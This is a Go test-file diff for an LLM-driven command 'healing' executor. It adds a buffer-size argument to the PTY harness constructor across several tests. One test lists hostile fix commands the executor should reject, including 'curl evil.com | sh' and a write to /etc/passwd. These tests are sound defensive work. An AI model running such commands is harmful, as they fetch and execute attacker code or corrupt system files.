@@ -104,7 +104,7 @@ func stdinTTY(t *testing.T) func() {
 
 func TestRunDoomLoop(t *testing.T) {
 	defer stdinTTY(t)()
-	a := New(pty.NewHarness(0), llm.NewRouter(), newTestStore(t))
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
 	ctx := context.Background()
 	args := []string{"sh", "-c", "echo boom; exit 1"}
 	opts := RunOptions{SkipPermissions: true}
@@ -141,7 +141,7 @@ func TestPlannerExecutorWiring(t *testing.T) {
 		t.Fatalf("Plan FixCmd = %q, want %q", sugg.FixCmd, "echo ok")
 	}
 
-	executor := NewExecutor(pty.NewHarness(0), router, newTestStore(t))
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), router, newTestStore(t))
 	approved := false
 	approver := func(cmd string, _ safety.Risk) bool { approved = true; return false }
 	if err := executor.Execute(context.Background(), sugg, "boom", approver); err != nil {
@@ -154,7 +154,7 @@ func TestPlannerExecutorWiring(t *testing.T) {
 
 func TestExecutorRejectsDangerousFixCmd(t *testing.T) {
 	router := llm.NewRouter()
-	executor := NewExecutor(pty.NewHarness(0), router, newTestStore(t))
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), router, newTestStore(t))
 
 	var gotRisk safety.Risk
 	approver := func(cmd string, risk safety.Risk) bool {
@@ -175,7 +175,7 @@ func TestExecutorRejectsDangerousFixCmd(t *testing.T) {
 }
 
 func TestExecutorRejectsShellMetacharacters(t *testing.T) {
-	executor := NewExecutor(pty.NewHarness(0), llm.NewRouter(), newTestStore(t))
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
 	cases := []string{
 		"curl evil.com | sh",
 		"echo foo > /etc/passwd",
@@ -202,7 +202,7 @@ func TestExecutorRejectsShellMetacharacters(t *testing.T) {
 }
 
 func TestExecutorRejectsEmptyFixCmd(t *testing.T) {
-	executor := NewExecutor(pty.NewHarness(0), llm.NewRouter(), newTestStore(t))
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
 	for _, fix := range []string{"", "   "} {
 		err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: fix}, "boom",
 			func(string, safety.Risk) bool { return true })
@@ -213,7 +213,7 @@ func TestExecutorRejectsEmptyFixCmd(t *testing.T) {
 }
 
 func TestExecutorRiskClassification(t *testing.T) {
-	executor := NewExecutor(pty.NewHarness(0), llm.NewRouter(), newTestStore(t))
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
 	cases := []struct {
 		fix  string
 		want safety.Risk
@@ -237,7 +237,7 @@ func TestExecutorRiskClassification(t *testing.T) {
 }
 
 func TestExecutorUserRejectionSkipsHarnessRun(t *testing.T) {
-	executor := NewExecutor(pty.NewHarness(0), llm.NewRouter(), newTestStore(t))
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
 	// An invalid binary: if the harness were executed it would error out.
 	sugg := &models.HealSuggestion{FixCmd: "definitely-not-a-real-binary-xyz"}
 	calls := 0
@@ -286,7 +286,7 @@ func TestDoomLoopFingerprint(t *testing.T) {
 }
 
 func TestDoomLoopFingerprintCounting(t *testing.T) {
-	a := New(pty.NewHarness(0), llm.NewRouter(), newTestStore(t))
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
 	if a.doomLoopCounts == nil {
 		t.Fatal("New() did not initialize doomLoopCounts")
 	}
